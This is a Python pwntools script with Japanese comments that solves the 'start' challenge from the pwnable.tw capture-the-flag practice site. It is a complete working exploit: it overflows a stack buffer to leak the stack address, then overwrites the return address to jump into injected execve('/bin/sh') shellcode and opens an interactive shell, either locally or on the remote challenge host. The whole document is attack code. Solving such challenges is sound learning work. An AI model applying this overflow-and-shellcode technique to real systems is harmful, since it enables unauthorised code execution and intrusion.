# coding: utf-8
from pwn import *

# 対象の情報を設定
context(os='linux', arch='i386')

HOST = 'chall.pwnable.tw'
PORT = 10000

# mov ecx, esp のアドレス
stack_leak = 0x08048087
shellcode = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

# リモートでもローカルでもできるようにする
if len(sys.argv) > 1 and sys.argv[1] == '-r':
    conn = remote(HOST, PORT)
else:
    conn = process('./start')

log.info('Pwning start')
# 最初に送られてくる出力を吐き出させる
# これをやらないとrecvのバッファの中に出力が溜まったままになる
conn.recvuntil(":")

# espの値をリークさせる
stage1 = b'A'*0x14
stage1 += p32(stack_leak)

# 実際に送りespの値を保存
# 一応、画面上にも出力する
conn.send(stage1)
stack_addr = u32(conn.recv(4))
log.info("Stack Address: {}".format(hex(stack_addr)))

# リークさせたespの値に文字列分のバイト数を足し、シェルコードを仕込んだ位置を決める
stage2 = b'B'*0x14
stage2 += p32(stack_addr + 0x14)
stage2 += shellcode

# シェルを取る
conn.sendline(stage2)
conn.interactive()
